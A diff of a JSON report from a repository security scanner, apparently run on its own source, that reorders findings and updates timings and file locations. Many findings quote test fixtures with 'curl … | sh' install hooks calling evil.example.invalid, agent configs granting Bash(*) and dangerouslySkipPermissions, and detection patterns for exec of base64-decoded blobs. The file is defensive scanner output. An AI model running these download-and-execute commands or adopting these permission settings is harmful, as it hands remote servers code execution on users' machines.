@@ -17,35 +17,35 @@
     "mode": "docker (--network none, read-only)",
     "profile": "balanced",
     "files": 175,
-    "seconds": 16.1,
+    "seconds": 19.1,
     "tools": {
       "gitleaks": {
         "findings": 0,
-        "seconds": 0.8,
+        "seconds": 0.9,
         "ok": true,
         "version": "8.30.1"
       },
       "semgrep": {
         "findings": 0,
-        "seconds": 1.8,
+        "seconds": 2.0,
         "ok": true,
         "version": "1.187.0"
       },
       "guarddog": {
         "findings": 19,
-        "seconds": 0.6,
+        "seconds": 0.7,
         "ok": true,
         "version": "3.2.0"
       },
       "bandit": {
         "findings": 488,
-        "seconds": 1.5,
+        "seconds": 1.6,
         "ok": true,
         "version": "1.9.4"
       },
       "agent-checks": {
         "findings": 336,
-        "seconds": 3.6,
+        "seconds": 4.5,
         "ok": true,
         "files": 175
       },
@@ -116,8 +116,8 @@
       "network": [
         {
           "value": "github.com",
-          "file": "repobeagle.py",
-          "line": 4766,
+          "file": "pyproject.toml",
+          "line": 21,
           "count": 48,
           "doc": false,
           "test": false,
@@ -186,10 +186,10 @@
         },
         {
           "value": "docs.oasis-open.org",
-          "file": "tests/schema/README.md",
-          "line": 6,
+          "file": "tests/schema/sarif-schema-2.1.0.json",
+          "line": 4,
           "count": 4,
-          "doc": true,
+          "doc": false,
           "test": true,
           "verified": false,
           "source": "static"
@@ -206,7 +206,7 @@
         },
         {
           "value": "a.example.com",
-          "file": "tests/fixtures/workspace-two/packages/b/index.html",
+          "file": "tests/fixtures/workspace-two/packages/a/index.html",
           "line": 1,
           "count": 3,
           "doc": true,
@@ -246,8 +246,8 @@
         },
         {
           "value": "gitlab.com",
-          "file": "tests/test_run.py",
-          "line": 43,
+          "file": "tests/test_supply_chain.py",
+          "line": 66,
           "count": 3,
           "doc": false,
           "test": true,
@@ -256,20 +256,20 @@
         },
         {
           "value": "images.unknown-cdn.dev",
-          "file": "tests/fixtures/trap-privacy/web/index.html",
-          "line": 12,
+          "file": "tests/fixtures/trap-privacy/web/widget.tsx",
+          "line": 2,
           "count": 3,
-          "doc": true,
+          "doc": false,
           "test": true,
           "verified": false,
           "source": "static"
         },
         {
           "value": "json-schema.org",
-          "file": "tests/schema/README.md",
-          "line": 8,
+          "file": "tests/schema/sarif-schema-2.1.0.json",
+          "line": 2,
           "count": 3,
-          "doc": true,
+          "doc": false,
           "test": true,
           "verified": false,
           "source": "static"
@@ -336,11 +336,11 @@
         },
         {
           "value": "example.com",
-          "file": ".github/workflows/nightly.yml",
-          "line": 63,
+          "file": "tests/test_run.py",
+          "line": 44,
           "count": 2,
           "doc": false,
-          "test": false,
+          "test": true,
           "verified": false,
           "source": "static"
         },
@@ -376,10 +376,10 @@
         },
         {
           "value": "www.googletagmanager.com",
-          "file": "tests/fixtures/trap-telemetry/src/app.js",
-          "line": 10,
+          "file": "tests/fixtures/trap-privacy/web/index.html",
+          "line": 17,
           "count": 2,
-          "doc": false,
+          "doc": true,
           "test": true,
           "verified": false,
           "source": "static"
@@ -718,10 +718,10 @@
       "filesystem": [
         {
           "value": ".env",
-          "file": "repobeagle.py",
-          "line": 119,
+          "file": "FEATURES.md",
+          "line": 1050,
           "count": 21,
-          "doc": false,
+          "doc": true,
           "test": false,
           "verified": false,
           "source": "static"
@@ -1648,7 +1648,7 @@
     "image_ref": "ghcr.io/javierbits/repobeagle:v1.170.1",
     "image_digest": "ghcr.io/javierbits/repobeagle@sha256:cb348a1fe418f376ce193f0ada133aee40a1b9a9b45d217e898ebfeec4f555f2",
     "toolchain_ref": "v1.170.1",
-    "run_url": "https://github.com/javierbits/repobeagle/actions/runs/45790090934",
+    "run_url": "https://github.com/javierbits/repobeagle/actions/runs/45790102439",
     "scanned_repo": "javierbits/repobeagle",
     "scanned_sha": "e893dc67391f23528cb3749ecd1b9d43c79b0e1d"
   },
@@ -2108,21 +2108,10 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 42,
+      "file": "tests/test_archives.py",
+      "line": 20,
       "title": "Download-and-execute (pipe to shell)",
-      "snippet": "regex: (?i).*(curl|wget|bash|powershell|\\|\\s*sh).*",
-      "meaning": "Runs whatever a remote server returns, with no review.",
-      "rule": "Download-and-execute",
-      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "tests/test_head.py",
-      "line": 51,
-      "title": "Download-and-execute (pipe to shell)",
-      "snippet": "\"package.json\": json.dumps({\"name\": \"x\", \"scripts\": {\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh\"}}),",
+      "snippet": "\"scripts\": {\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh\"}})",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2134,17 +2123,6 @@
       "line": 65,
       "title": "Download-and-execute (pipe to shell)",
       "snippet": "check tests/fixtures/ignore-suppressed GREEN $L # .repobeagleignore suppresses the curl|sh finding",
-      "meaning": "Runs whatever a remote server returns, with no review.",
-      "rule": "Download-and-execute",
-      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "tests/test_archives.py",
-      "line": 20,
-      "title": "Download-and-execute (pipe to shell)",
-      "snippet": "\"scripts\": {\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh\"}})",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2174,10 +2152,10 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-npm/package.json",
-      "line": 8,
+      "file": "tests/test_head.py",
+      "line": 51,
       "title": "Download-and-execute (pipe to shell)",
-      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
+      "snippet": "\"package.json\": json.dumps({\"name\": \"x\", \"scripts\": {\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh\"}}),",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2196,10 +2174,10 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/ignore-suppressed/install.sh",
-      "line": 3,
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 9,
       "title": "Download-and-execute (pipe to shell)",
-      "snippet": "curl -fsSL https://get.tiny.dev/install.sh | sh",
+      "snippet": "\"args\": [\"-c\", \"curl -s https://evil.example.invalid/m | sh\"],",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2207,10 +2185,10 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-build/build.rs",
-      "line": 2,
+      "file": "tests/fixtures/trap-npm/package.json",
+      "line": 8,
       "title": "Download-and-execute (pipe to shell)",
-      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
+      "snippet": "\"postinstall\": \"curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js\"",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2229,6 +2207,17 @@
     {
       "tool": "agent-checks",
       "severity": "high",
+      "file": "tests/fixtures/trap-build/build.rs",
+      "line": 2,
+      "title": "Download-and-execute (pipe to shell)",
+      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "rule": "Download-and-execute",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
       "file": "tests/fixtures/trap-build/cmd/gen.go",
       "line": 3,
       "title": "Download-and-execute (pipe to shell)",
@@ -2240,10 +2229,10 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
-      "line": 9,
+      "file": "tests/fixtures/ignore-suppressed/install.sh",
+      "line": 3,
       "title": "Download-and-execute (pipe to shell)",
-      "snippet": "\"args\": [\"-c\", \"curl -s https://evil.example.invalid/m | sh\"],",
+      "snippet": "curl -fsSL https://get.tiny.dev/install.sh | sh",
       "meaning": "Runs whatever a remote server returns, with no review.",
       "rule": "Download-and-execute",
       "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
@@ -2252,81 +2241,12 @@
       "tool": "agent-checks",
       "severity": "high",
       "file": "rules/custom.yml",
-      "line": 7,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: exec(base64.b64decode(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 8,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: eval(base64.b64decode(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 9,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: exec(zlib.decompress(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 11,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: exec(codecs.decode(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 17,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: eval(atob(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 18,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: eval(Buffer.from(..., \"base64\").toString(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 19,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: new Function(Buffer.from(..., \"base64\").toString(...))",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "high",
-      "file": "rules/custom.yml",
-      "line": 20,
-      "title": "eval/exec of decoded blob",
-      "snippet": "- pattern: eval(Buffer.from(..., 'base64').toString())",
-      "meaning": "Typical obfuscated-payload loader.",
-      "rule": "eval/exec of decoded blob"
+      "line": 42,
+      "title": "Download-and-execute (pipe to shell)",
+      "snippet": "regex: (?i).*(curl|wget|bash|powershell|\\|\\s*sh).*",
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "rule": "Download-and-execute",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts"
     },
     {
       "tool": "agent-checks",
@@ -2349,6 +2269,72 @@
       "meaning": "Secrets written to logs or files can leak.",
       "rule": "gha-secret-echo",
       "remediation": "stop echoing secrets; rely on masking and scope `env:` to the step that needs it"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 5,
+      "title": "Filesystem access to root/home directory",
+      "snippet": "/",
+      "meaning": "The server can read and write your entire disk/home, including keys and .env files.",
+      "rule": "Filesystem access to root/home directory",
+      "remediation": "narrow the allowed paths to the repository, or mount the home directory read-only"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 8,
+      "title": "MCP/plugin server runs a raw shell or downloader",
+      "snippet": "bash",
+      "meaning": "The server definition hands the agent a general shell or fetches remote code.",
+      "rule": "MCP/plugin server runs a raw shell or downloader",
+      "remediation": "prefer a protocol-speaking server, or pin the download and verify a checksum"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 9,
+      "title": "MCP/plugin server runs a raw shell or downloader",
+      "snippet": "curl -s https://evil.example.invalid/m | sh",
+      "meaning": "The server definition hands the agent a general shell or fetches remote code.",
+      "rule": "MCP/plugin server runs a raw shell or downloader",
+      "remediation": "prefer a protocol-speaking server, or pin the download and verify a checksum"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 10,
+      "title": "Over-broad tool permission / auto-approve",
+      "snippet": "*",
+      "meaning": "Grants the agent every tool or unrestricted shell without confirmation.",
+      "rule": "Over-broad tool permission / auto-approve",
+      "remediation": "replace `*` / `Bash(*)` with the specific tools the agent needs"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 14,
+      "title": "Over-broad tool permission / auto-approve",
+      "snippet": "Bash(*)",
+      "meaning": "Grants the agent every tool or unrestricted shell without confirmation.",
+      "rule": "Over-broad tool permission / auto-approve",
+      "remediation": "replace `*` / `Bash(*)` with the specific tools the agent needs"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "tests/fixtures/trap-skill/mcp.json",
+      "line": 15,
+      "title": "Dangerous flag enabled (dangerouslySkipPermissions)",
+      "snippet": "dangerouslySkipPermissions",
+      "meaning": "Disables confirmation prompts for agent actions.",
+      "rule": "Dangerous flag enabled",
+      "remediation": "drop `dangerouslySkipPermissions`; approve actions per call, or scope the sandbox"
     },
     {
       "tool": "agent-checks",
@@ -2452,68 +2438,82 @@
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
-      "line": 5,
-      "title": "Filesystem access to root/home directory",
-      "snippet": "/",
-      "meaning": "The server can read and write your entire disk/home, including keys and .env files.",
-      "rule": "Filesystem access to root/home directory",
-      "remediation": "narrow the allowed paths to the repository, or mount the home directory read-only"
+      "file": "rules/custom.yml",
+      "line": 7,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: exec(base64.b64decode(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
+      "file": "rules/custom.yml",
       "line": 8,
-      "title": "MCP/plugin server runs a raw shell or downloader",
-      "snippet": "bash",
-      "meaning": "The server definition hands the agent a general shell or fetches remote code.",
-      "rule": "MCP/plugin server runs a raw shell or downloader",
-      "remediation": "prefer a protocol-speaking server, or pin the download and verify a checksum"
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: eval(base64.b64decode(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
+      "file": "rules/custom.yml",
       "line": 9,
-      "title": "MCP/plugin server runs a raw shell or downloader",
-      "snippet": "curl -s https://evil.example.invalid/m | sh",
-      "meaning": "The server definition hands the agent a general shell or fetches remote code.",
-      "rule": "MCP/plugin server runs a raw shell or downloader",
-      "remediation": "prefer a protocol-speaking server, or pin the download and verify a checksum"
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: exec(zlib.decompress(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
-      "line": 10,
-      "title": "Over-broad tool permission / auto-approve",
-      "snippet": "*",
-      "meaning": "Grants the agent every tool or unrestricted shell without confirmation.",
-      "rule": "Over-broad tool permission / auto-approve",
-      "remediation": "replace `*` / `Bash(*)` with the specific tools the agent needs"
+      "file": "rules/custom.yml",
+      "line": 11,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: exec(codecs.decode(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
-      "line": 14,
-      "title": "Over-broad tool permission / auto-approve",
-      "snippet": "Bash(*)",
-      "meaning": "Grants the agent every tool or unrestricted shell without confirmation.",
-      "rule": "Over-broad tool permission / auto-approve",
-      "remediation": "replace `*` / `Bash(*)` with the specific tools the agent needs"
+      "file": "rules/custom.yml",
+      "line": 17,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: eval(atob(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "agent-checks",
       "severity": "high",
-      "file": "tests/fixtures/trap-skill/mcp.json",
-      "line": 15,
-      "title": "Dangerous flag enabled (dangerouslySkipPermissions)",
-      "snippet": "dangerouslySkipPermissions",
-      "meaning": "Disables confirmation prompts for agent actions.",
-      "rule": "Dangerous flag enabled",
-      "remediation": "drop `dangerouslySkipPermissions`; approve actions per call, or scope the sandbox"
+      "file": "rules/custom.yml",
+      "line": 18,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: eval(Buffer.from(..., \"base64\").toString(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "rules/custom.yml",
+      "line": 19,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: new Function(Buffer.from(..., \"base64\").toString(...))",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "high",
+      "file": "rules/custom.yml",
+      "line": 20,
+      "title": "eval/exec of decoded blob",
+      "snippet": "- pattern: eval(Buffer.from(..., 'base64').toString())",
+      "meaning": "Typical obfuscated-payload loader.",
+      "rule": "eval/exec of decoded blob"
     },
     {
       "tool": "telemetry",
@@ -3053,28 +3053,6 @@
     {
       "tool": "agent-checks",
       "severity": "medium",
-      "file": "tests/fixtures/trap-gha/.github/workflows/after.yml",
-      "line": 3,
-      "title": "gha-privileged-trigger: workflow uses workflow_run",
-      "snippet": "workflow_run",
-      "meaning": "Runs with repository secrets on events from forks; review carefully.",
-      "rule": "gha-privileged-trigger",
-      "remediation": "prefer `pull_request`, and check who can push to `workflow_run` upstream branches"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
-      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
-      "line": 14,
-      "title": "gha-curl-pipe-shell: workflow pipes a download into a shell",
-      "snippet": "- run: curl -fsSL https://get.example.invalid/setup.sh | bash",
-      "meaning": "CI runs whatever the remote server returns, with CI secrets available.",
-      "rule": "gha-curl-pipe-shell",
-      "remediation": "download to a file, verify a checksum, then execute it (avoid `curl \u2026 | sh` in workflows)"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
       "file": "tests/fixtures/trap-markdown/docs/guide.md",
       "line": 5,
       "title": "md-comment-instruction: hidden HTML comment with agent/exfil wording",
@@ -3130,56 +3108,34 @@
     {
       "tool": "agent-checks",
       "severity": "medium",
-      "file": "tests/fixtures/trap-build/build.rs",
-      "line": 2,
-      "title": "rust-build-rs: Cargo build script runs commands / network",
-      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
-      "meaning": "build.rs executes on `cargo build` with your permissions.",
-      "rule": "rust-build-rs",
-      "remediation": "review the build script/backend; it runs at install or build time"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
-      "file": "tests/fixtures/trap-build/pyproject.toml",
-      "line": 3,
-      "title": "pip-build-hook: non-standard build backend",
-      "snippet": "build-backend = \"evilbuild.api",
-      "meaning": "An unknown PEP 517 backend runs arbitrary code on pip install.",
-      "rule": "pip-build-hook",
-      "remediation": "review the build script/backend; it runs at install or build time"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
-      "file": "tests/fixtures/trap-build/binding.gyp",
-      "line": 1,
-      "title": "node-gyp-action: node-gyp action runs a command at build",
-      "snippet": "{ \"targets\": [ { \"target_name\": \"addon\", \"actions\": [ { \"action_name\": \"pre\", \"inputs\": [], \"outputs\": [\"x\"], \"action\": [\"sh\", \"-c\", \"curl https://x.example.inv",
-      "meaning": "Executed by node-gyp during `npm install` of native addons.",
-      "rule": "node-gyp-action",
-      "remediation": "review the build script/backend; it runs at install or build time"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
-      "file": "tests/fixtures/trap-binary/src/loader.js",
-      "line": 1,
-      "title": "high-entropy-blob: 800-char encoded blob (entropy 5.94)",
-      "snippet": "const p=\"PtYgjmUhBel31iEl2hpChYgCfrL1spNxnyVmihA/2O76UMFxFkM/R5Kjp1vRt+1fjORS/6i...",
-      "meaning": "Embedded high-entropy payloads are often used to hide malware.",
-      "rule": "high-entropy-blob",
-      "remediation": "confirm the blob's origin (generated asset, certificate, embedded binary), or move it out of the source tree"
-    },
-    {
-      "tool": "agent-checks",
-      "severity": "medium",
-      "file": "tests/fixtures/control-binary-only/firmware.bin",
+      "file": "tests/fixtures/control-archive-only/bundle.zip",
       "line": 0,
-      "title": "Prebuilt binary/compiled artifact in repo",
-      "snippet": ".bin",
-      "meaning": "Binaries can't be reviewed as source; verify where they came from.",
-      "rule": "Prebuilt binary/compiled artifact in repo"
+      "title": "Archive in repo (contents not scanned)",
+      "snippet": "bundle.zip",
+      "meaning": "Archives are never extracted; review where it came from.",
+      "rule": "Archive in repo"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/trap-gha/.github/workflows/after.yml",
+      "line": 3,
+      "title": "gha-privileged-trigger: workflow uses workflow_run",
+      "snippet": "workflow_run",
+      "meaning": "Runs with repository secrets on events from forks; review carefully.",
+      "rule": "gha-privileged-trigger",
+      "remediation": "prefer `pull_request`, and check who can push to `workflow_run` upstream branches"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/trap-gha/.github/workflows/ci.yml",
+      "line": 14,
+      "title": "gha-curl-pipe-shell: workflow pipes a download into a shell",
+      "snippet": "- run: curl -fsSL https://get.example.invalid/setup.sh | bash",
+      "meaning": "CI runs whatever the remote server returns, with CI secrets available.",
+      "rule": "gha-curl-pipe-shell",
+      "remediation": "download to a file, verify a checksum, then execute it (avoid `curl \u2026 | sh` in workflows)"
     },
     {
       "tool": "agent-checks",
@@ -3206,12 +3162,56 @@
     {
       "tool": "agent-checks",
       "severity": "medium",
-      "file": "tests/fixtures/control-archive-only/bundle.zip",
+      "file": "tests/fixtures/trap-build/pyproject.toml",
+      "line": 3,
+      "title": "pip-build-hook: non-standard build backend",
+      "snippet": "build-backend = \"evilbuild.api",
+      "meaning": "An unknown PEP 517 backend runs arbitrary code on pip install.",
+      "rule": "pip-build-hook",
+      "remediation": "review the build script/backend; it runs at install or build time"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/trap-build/binding.gyp",
+      "line": 1,
+      "title": "node-gyp-action: node-gyp action runs a command at build",
+      "snippet": "{ \"targets\": [ { \"target_name\": \"addon\", \"actions\": [ { \"action_name\": \"pre\", \"inputs\": [], \"outputs\": [\"x\"], \"action\": [\"sh\", \"-c\", \"curl https://x.example.inv",
+      "meaning": "Executed by node-gyp during `npm install` of native addons.",
+      "rule": "node-gyp-action",
+      "remediation": "review the build script/backend; it runs at install or build time"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/trap-build/build.rs",
+      "line": 2,
+      "title": "rust-build-rs: Cargo build script runs commands / network",
+      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
+      "meaning": "build.rs executes on `cargo build` with your permissions.",
+      "rule": "rust-build-rs",
+      "remediation": "review the build script/backend; it runs at install or build time"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/control-binary-only/firmware.bin",
       "line": 0,
-      "title": "Archive in repo (contents not scanned)",
-      "snippet": "bundle.zip",
-      "meaning": "Archives are never extracted; review where it came from.",
-      "rule": "Archive in repo"
+      "title": "Prebuilt binary/compiled artifact in repo",
+      "snippet": ".bin",
+      "meaning": "Binaries can't be reviewed as source; verify where they came from.",
+      "rule": "Prebuilt binary/compiled artifact in repo"
+    },
+    {
+      "tool": "agent-checks",
+      "severity": "medium",
+      "file": "tests/fixtures/trap-binary/src/loader.js",
+      "line": 1,
+      "title": "high-entropy-blob: 800-char encoded blob (entropy 5.94)",
+      "snippet": "const p=\"PtYgjmUhBel31iEl2hpChYgCfrL1spNxnyVmihA/2O76UMFxFkM/R5Kjp1vRt+1fjORS/6i...",
+      "meaning": "Embedded high-entropy payloads are often used to hide malware.",
+      "rule": "high-entropy-blob",
+      "remediation": "confirm the blob's origin (generated asset, certificate, embedded binary), or move it out of the source tree"
     },
     {
       "tool": "telemetry",
@@ -3238,22 +3238,22 @@
     {
       "tool": "telemetry",
       "severity": "medium",
-      "file": "tests/fixtures/trap-telemetry/src/app.js",
-      "line": 10,
+      "file": "tests/fixtures/trap-privacy/web/consent.html",
+      "line": 4,
       "title": "telemetry-analytics: Google Analytics",
-      "snippet": "script.src = \"https://www.googletagmanager.com/gtag/js?id=G-EXAMPLE1\";",
-      "meaning": "Product/web analytics: page views, events and a persistent identifier leave the device. Seen 3 times; first at tests/fixtures/trap-telemetry/src/app.js:10. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
+      "snippet": "<script>gtag('js', new Date());</script>",
+      "meaning": "Product/web analytics: page views, events and a persistent identifier leave the device. Seen 3 times; first at tests/fixtures/trap-privacy/web/consent.html:4. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
       "rule": "telemetry-analytics",
       "remediation": "gate the SDK behind consent, or disable it with its documented opt-out"
     },
     {
       "tool": "telemetry",
       "severity": "medium",
-      "file": "tests/fixtures/trap-telemetry/src/app.js",
-      "line": 10,
+      "file": "tests/fixtures/trap-privacy/web/index.html",
+      "line": 17,
       "title": "telemetry-analytics: Google Tag Manager",
-      "snippet": "script.src = \"https://www.googletagmanager.com/gtag/js?id=G-EXAMPLE1\";",
-      "meaning": "Product/web analytics: page views, events and a persistent identifier leave the device. Seen 2 times; first at tests/fixtures/trap-telemetry/src/app.js:10. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
+      "snippet": "<script src=\"https://www.googletagmanager.com/gtm.js?id=GTM-ABC123\"></script>",
+      "meaning": "Product/web analytics: page views, events and a persistent identifier leave the device. Seen 2 times; first at tests/fixtures/trap-privacy/web/index.html:17. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
       "rule": "telemetry-analytics",
       "remediation": "gate the SDK behind consent, or disable it with its documented opt-out"
     },
@@ -3326,11 +3326,11 @@
     {
       "tool": "telemetry",
       "severity": "medium",
-      "file": "repobeagle.py",
-      "line": 854,
+      "file": "requirements.lock",
+      "line": 453,
       "title": "telemetry-apm: OpenTelemetry (OTEL)",
-      "snippet": "\"apm\": \"APM/tracing: spans, logs or metrics are exported; OTEL only sends if an exporter endpoint is configured.\",",
-      "meaning": "APM/tracing: spans, logs or metrics are exported; OTEL only sends if an exporter endpoint is configured. Seen 15 times; first at repobeagle.py:854. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
+      "snippet": "opentelemetry-api==1.37.0 \\",
+      "meaning": "APM/tracing: spans, logs or metrics are exported; OTEL only sends if an exporter endpoint is configured. Seen 15 times; first at requirements.lock:453. Opt-out handled in code: ASTRO_TELEMETRY_DISABLED, CHECKPOINT_DISABLE, DISABLE_TELEMETRY, DOTNET_CLI_TELEMETRY_OPTOUT.",
       "rule": "telemetry-apm",
       "remediation": "gate the SDK behind consent, or disable it with its documented opt-out"
     },
@@ -8617,16 +8617,6 @@
     {
       "tool": "agent-checks",
       "severity": "low",
-      "file": "repobeagle.py",
-      "line": 321,
-      "title": "Code reads .env (project config, not a credential store)",
-      "snippet": "add(\"high\", \"Filesystem access to root/home directory\", sval, \"The server can read and write your entire disk/home, including keys and .env files.\")",
-      "meaning": "Reading the repo's own .env is normal; review only that the values are not sent somewhere unexpected.",
-      "rule": "Code reads .env"
-    },
-    {
